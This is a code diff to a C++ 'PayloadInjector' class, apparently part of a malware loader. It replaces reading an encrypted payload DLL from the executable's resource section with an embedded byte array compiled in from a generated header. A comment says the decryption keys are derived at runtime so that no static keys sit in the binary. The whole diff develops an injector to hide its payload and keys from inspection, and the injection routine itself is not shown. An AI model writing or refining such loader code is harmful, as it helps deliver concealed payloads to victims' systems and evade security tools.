@@ -4,7 +4,7 @@
 #include "injector.hpp"
 #include "../crypto/crypto.hpp"
 #include "../sys/internal_api.hpp"
-#include <iostream>
+#include "../../build/payload_data.hpp"
 #include <sstream>
 
 namespace Injector {
@@ -74,19 +74,13 @@ namespace Injector {
     }
 
     void PayloadInjector::LoadAndDecryptPayload() {
-        HMODULE hModule = GetModuleHandle(NULL);
-        HRSRC hRes = FindResourceW(hModule, L"PAYLOAD_DLL", MAKEINTRESOURCEW(10));
-        if (!hRes) throw std::runtime_error("Payload resource not found");
+        static_assert(Payload::Embedded::Size > 0, "Embedded payload is empty");
 
-        HGLOBAL hData = LoadResource(hModule, hRes);
-        if (!hData) throw std::runtime_error("LoadResource failed");
+        m_payload.assign(
+            Payload::Embedded::Data,
+            Payload::Embedded::Data + Payload::Embedded::Size
+        );
 
-        void* pData = LockResource(hData);
-        DWORD size = SizeofResource(hModule, hRes);
-        if (!pData || size == 0) throw std::runtime_error("Invalid resource");
-
-        m_payload.assign((uint8_t*)pData, (uint8_t*)pData + size);
-        
         // Use runtime-derived keys (no static keys in binary)
         if (!Crypto::DecryptPayload(m_payload)) {
             throw std::runtime_error("Failed to derive decryption keys");
